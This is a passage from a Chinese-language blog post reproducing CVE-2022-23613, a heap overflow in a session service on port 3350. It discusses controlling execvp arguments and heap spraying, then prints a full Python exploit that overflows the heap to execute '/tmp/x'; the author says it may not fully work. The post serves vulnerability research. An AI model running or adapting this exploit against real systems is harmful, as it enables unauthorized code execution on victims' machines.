*args[])</span><br>&#123;<br>    <span class="hljs-type">int</span> rv;<br>    <span class="hljs-type">char</span> args_str[ARGS_STR_LEN];<br>    <span class="hljs-type">int</span> args_len;<br><br>    args_len = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (args[args_len] != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        args_len++;<br>    &#125;<br><br>    g_strnjoin(args_str, ARGS_STR_LEN, <span class="hljs-string">&quot; &quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> **) args, args_len);<br><br>    LOG(LOG_LEVEL_DEBUG,<br>        <span class="hljs-string">&quot;Calling exec (excutable: %s, arguments: %s)&quot;</span>,<br>        p1, args_str);<br><br>    g_rm_temp_dir();<br>    rv = execvp(p1, args);<br><br>    <span class="hljs-comment">/* should not get here */</span><br>    LOG(LOG_LEVEL_ERROR,<br>        <span class="hljs-string">&quot;Error calling exec (excutable: %s, arguments: %s) &quot;</span><br>        <span class="hljs-string">&quot;returned errno: %d, description: %s&quot;</span>,<br>        p1, args_str, g_get_errno(), g_get_strerror());<br><br>    g_mk_socket_path(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> rv;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br></code></pre></td></tr></table></figure>

<p> <code>self-&gt;in_s-&gt;end</code> 为 0 将会失败，因为 <code>args[args_len]</code> 会引用错误的地址。因此最好的办法是找一个地方，让 <code>self-&gt;in_s-&gt;end</code> 能够指向 0 。</p>
<p>这似乎是有可能实现的，而且即便我们找不到任何指向 0 的指针，只要能有一片连续的地址保持如下结构就行了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">addr1 | addr2 | addr3 | <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>

<p>甚至于，直接尝试堆喷去撞那个将近 1% 的概率似乎也不是不能接受。</p>
<p>加之第一个参数是稳定控制的，尽管能写的字符数不多，但 ”&#x2F;tmp&#x2F;x“ 总共也不到八字节，绰绰有余。</p>
<p>这么一看，似乎对参数就有很多余裕了，只要参数符合调用规则，任意参数都可以。因此接下来就只剩下找到一个合适的地址作为参数去构造了。</p>
<p>最后的 EXP 结构大致如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pack_addr2</span>():<br>    sdata = <span class="hljs-string">b&quot;\xba\xc9\x40\x00\x00\x00\x00\x00&quot;</span><br>    <span class="hljs-keyword">return</span> sdata<br><br>s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>s.connect((<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">3350</span>))<br><br>con_list=[<span class="hljs-number">0</span>]*<span class="hljs-number">300</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>):<br>    con_list[i] = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>    con_list[i].connect((<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">3350</span>))<br>    sdata = <span class="hljs-string">b&#x27;&#x27;</span><br>    sdata += struct.pack(<span class="hljs-string">&quot;I&quot;</span>,<span class="hljs-number">0x2222CCCC</span>)<br>    sdata += struct.pack(<span class="hljs-string">&quot;&gt;I&quot;</span>,<span class="hljs-number">0x80000000</span>)<br>    con_list[i].send(sdata)<br>    sdata = pack_addr2()*<span class="hljs-number">0x3f0</span><br>    con_list[i].send(sdata)<br>    time.sleep(<span class="hljs-number">0.05</span>)<br><br>con_list[<span class="hljs-number">14</span>] = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>con_list[<span class="hljs-number">14</span>].connect((<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">3350</span>))<br>con_list[<span class="hljs-number">15</span>] = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>con_list[<span class="hljs-number">15</span>].connect((<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">3350</span>))<br><br>x = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>x.connect((<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">3350</span>))<br><br><br><span class="hljs-comment"># init stream</span><br>sdata = <span class="hljs-string">b&#x27;&#x27;</span><br>sdata += struct.pack(<span class="hljs-string">&quot;I&quot;</span>,<span class="hljs-number">0x2222CCCC</span>) <span class="hljs-comment">#version</span><br>sdata += struct.pack(<span class="hljs-string">&quot;&gt;I&quot;</span>,<span class="hljs-number">0x80000000</span>) <span class="hljs-comment">#headersize</span><br>con_list[<span class="hljs-number">15</span>].send(sdata)<br>sdata = <span class="hljs-string">b&#x27;D&#x27;</span>*<span class="hljs-number">0x10</span><br>con_list[<span class="hljs-number">15</span>].send(sdata)<br><br><span class="hljs-comment"># heap overflow</span><br>sdata = <span class="hljs-string">b&#x27;&#x27;</span><br>sdata += struct.pack(<span class="hljs-string">&quot;I&quot;</span>,<span class="hljs-number">0x2222CCCC</span>) <span class="hljs-comment">#version</span><br>sdata += struct.pack(<span class="hljs-string">&quot;&gt;I&quot;</span>,<span class="hljs-number">0x80000000</span>) <span class="hljs-comment">#headersize</span><br>con_list[<span class="hljs-number">14</span>].send(sdata)<br>sdata = <span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x4140</span>+<span class="hljs-string">b&quot;\xb1\x02\x00\x00\x00\x00\x00\x00&quot;</span>+<span class="hljs-string">b&quot;/tmp/x\x00\x00&quot;</span>+<span class="hljs-string">b&quot;\x01\x00\x00\x00&quot;</span>*<span class="hljs-number">2</span><br>sdata+=<span class="hljs-string">b&quot;\x02\x00\x00\x00\x00\x00\x00\x00&quot;</span>+<span class="hljs-string">b&quot;\xba\xc9\x40\x00\x00\x00\x00\x00&quot;</span>+<span class="hljs-string">b&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span><br>sdata+=<span class="hljs-string">b&quot;\x00\x00\x00\x7f\x00\x00\x00\x00&quot;</span>+<span class="hljs-string">b&quot;\xba\xc9\x40\x00\x00\x00\x00\x00&quot;</span>+<span class="hljs-string">b&quot;\xf0\x93\x3a\x02\x00\x00\x00\x00&quot;</span><br>sdata+=<span class="hljs-string">b&quot;P&quot;</span>*<span class="hljs-number">0x240</span>+<span class="hljs-string">b&quot;\xf0\x3b\x40\x00\x00\x00\x00\x00&quot;</span>+<span class="hljs-string">b&quot;\xf0\x3a\x40\x00\x00\x00\x00\x00&quot;</span><br>sdata+=<span class="hljs-string">b&quot;\x64\x54\x40\x00\x00\x00\x00\x00&quot;</span><br>con_list[<span class="hljs-number">14</span>].send(sdata)<br><br><span class="hljs-comment"># trigger execlp</span><br>sdata = <span class="hljs-string">b&#x27;&#x27;</span><br>sdata += struct.pack(<span class="hljs-string">&quot;I&quot;</span>,<span class="hljs-number">0x2222CCCC</span>)<br>sdata += <span class="hljs-string">b&quot;\x58\x01\xda\x00\x00\x00\x00\x00&quot;</span><br>con_list[<span class="hljs-number">15</span>].send(sdata)<br></code></pre></td></tr></table></figure>

<blockquote>
<p>这个 exp 可能是不通的，因为我选了用 execlp 去完成。主要是做到这一步之后，我感兴趣的部分已经全都完成了，所以差不多就停了，并且本文也已经写完了。</p>
<p>如果读者对 execvp 的方案感兴趣，也可以自行尝试一下。</p>
</blockquote>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/01/02/catctf2022-writeup/">← 下一篇 NepnepxCATCTF2022 writeup by TokameinE</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2022/09/20/%E9%9B%B6%E5%9F%BA%E7%A1%80%E8%A6%81%E5%A6%82%E4%BD%95%E7%A0%B4%E9%99%A4-IO-FILE-%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86%E7%9A%84%E8%BF%B7%E9%9B%BE/">零基础要如何破除 IO_FILE 利用原理的迷雾 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/6.png" alt="Logo"></a><h1 id="Dr"><a href="TokameinE">TokameinE</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/ErodedElk"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" target="_blank" rel="noopener" href="https://space.bilibili.com/1782544616"><i class="fa-brands fa-bilibili" alt="BiliBili"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2022-23613%E5%A4%8D%E7%8E%B0%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8F%AF%E8%83%BD%E6%80%A7"><span class="toc-number">1.</span> <span class="toc-text">CVE-2022-23613复现与漏洞利用可能性</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83"><span class="toc-number">1.1.</span> <span class="toc-text">复现环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E6%8E%A7%E5%88%B6%E7%9A%84%E9%9A%BE%E7%82%B9"><span class="toc-number">1.3.1.</span> <span class="toc-text">参数控制的难点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E7%BB%93%E6%9E%84%E4%BD%93%E7%9A%84%E7%BB%86%E8%8A%82"><span class="toc-number">1.3.2.</span> <span class="toc-text">覆盖结构体的细节</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%96%B7%E7%9A%84%E5%8F%AF%E8%83%BD%E6%80%A7"><span class="toc-number">1.3.3.</span> <span class="toc-text">堆喷的可能性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E5%A0%86%E5%96%B7%E6%80%9D%E8%B7%AF%E7%9A%84%E4%BC%98%E5%8C%96"><span class="toc-number">1.3.4.</span> <span class="toc-text">对堆喷思路的优化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%B3%95%E4%B8%8E%E4%BE%8B%E5%A4%96"><span class="toc-number">1.3.5.</span> <span class="toc-text">第二法与例外</span></a></li></ol></li></ol></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> 主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>